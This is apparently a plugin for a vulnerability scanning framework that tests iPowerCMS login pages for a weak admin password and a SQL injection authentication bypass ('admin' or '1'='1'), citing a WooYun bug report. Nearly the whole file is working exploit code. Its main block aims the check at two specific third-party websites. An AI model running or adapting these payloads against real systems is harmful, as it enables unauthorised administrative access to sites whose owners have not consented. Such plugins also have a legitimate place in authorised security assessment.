#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ =  ipowercms weak password

def assign(service, arg):
	if service == 'ipowercms':
		return True, arg

def audit(arg):
    #No.1 http://www.wooyun.org/bugs/wooyun-2010-0110152
    payloads = ["m/manager/login.xml.php?username=admin&password=1&vcode=",
               "m/manager/login.xml.php?username=admin'%20or%20'1'='1&password=1&vcode="
               ]
    for payload in payloads:
        target = arg + payload
        code, head, body, errcode, final_url = curl.curl2(target);
        if '<v>1</v>' in body:
            security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('ipowercms', 'http://www.cqnbshw.com/')[1]) 
    audit(assign('ipowercms', 'http://www.cqhfyt.com/')[1])               
